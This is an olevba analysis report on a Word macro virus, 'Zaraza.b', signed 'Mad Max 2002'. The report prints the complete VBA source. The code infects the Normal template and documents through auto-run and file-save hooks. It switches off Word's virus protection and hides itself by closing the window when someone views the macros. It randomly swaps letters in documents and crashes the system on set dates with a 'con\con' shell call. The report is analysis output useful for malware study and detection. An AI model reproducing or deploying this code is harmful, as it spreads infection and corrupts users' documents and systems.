olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zaraza.b-f692d466074d942d29043209a4e9f9e4b4796795
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zaraza.b-f692d466074d942d29043209a4e9f9e4b4796795 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO zaraza.bas 
in file: Virus.MSWord.Zaraza.b-f692d466074d942d29043209a4e9f9e4b4796795 - OLE stream: 'Macros/VBA/zaraza'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Attribute VB_Name = "zaraza"
' Version 2.0
    
Sub zaraza()
    On Error Resume Next
If Application.UserName <> "Predator" Then
    Randomize
    path_1 = "c:\windows\system\sys_z.drv"
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Call e
    ActiveDocument.ReadOnlyRecommended = False
    With Dialogs(wdDialogFileSummaryInfo)
      .Comments = "Created by Mad Max (c) 2002"
      .Execute
    End With
    infa = Int(Rnd * 10000)
    If infa = 26 Then Call zamena
    If Left(Date, 5) = "14.12" Or Left(Date, 5) = "28.08" Or Left(Date, 2) = "31" Or Left(Date, 2) = "30" Then Call zavis
            
    If Application.UserInitials = "M" Then UI = True
    If NormalTemplate.VBProject.VBComponents.Item("zaraza").Name <> "zaraza" Then nt = True
    If ActiveDocument.VBProject.VBComponents.Item("zaraza").Name <> "zaraza" Then ad = True
    If nt = True And ad = False Then Set impor_1 = NormalTemplate.VBProject.VBComponents
    If nt = False And ad = True Then Set impor_1 = ActiveDocument.VBProject.VBComponents
    impor_1.import path_1
    
    If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    If ad = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save

    End If
End Sub

Sub e()
    ActiveDocument.VBProject.VBComponents("zaraza").Export ("c:\windows\system\sys_z.drv")
End Sub

Sub AutoOpen()
    On Error Resume Next
    Call zaraza
End Sub

Sub AutoNew()
    On Error Resume Next
    Call zaraza
End Sub

Sub AutoClose()
    On Error Resume Next
    Call zaraza
End Sub

Sub HelpAbout()
    On Error Resume Next
    MsgBox "                   Hello It's Me :-) " + Chr(13) + _
           "This virus created by Mad Max (c) 2002" + Chr(13) + _
           "        Version - 2.0 from 09/11/2002"
End Sub

Sub FileSave()
    On Error Resume Next
    Call zaraza
    ActiveDocument.Save
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
    Call zaraza
End Sub

Sub FileTemplates()
    On Error Resume Next
    Call zaraza
    Call IR_
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Call zaraza
    Call IR_
End Sub

Sub ViewVBCode()
    On Error Resume Next
    Call zaraza
    Call IR_
End Sub

Sub IR_()
    MsgBox "Internal Error"
    ActiveWindow.Close SaveChanges:=SaveChanges
End Sub


Sub zamena()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "о"
            .Replacement.Text = "а"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = False
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
End Sub

' Если "вскроете", большая просьба отписать мне на мыло
' maxvolnov@inbox.ru и не кидать в меня камнями по поводу багов

Sub zavis()
    Dim visim
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    visim = Shell("con\con", vbHide)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

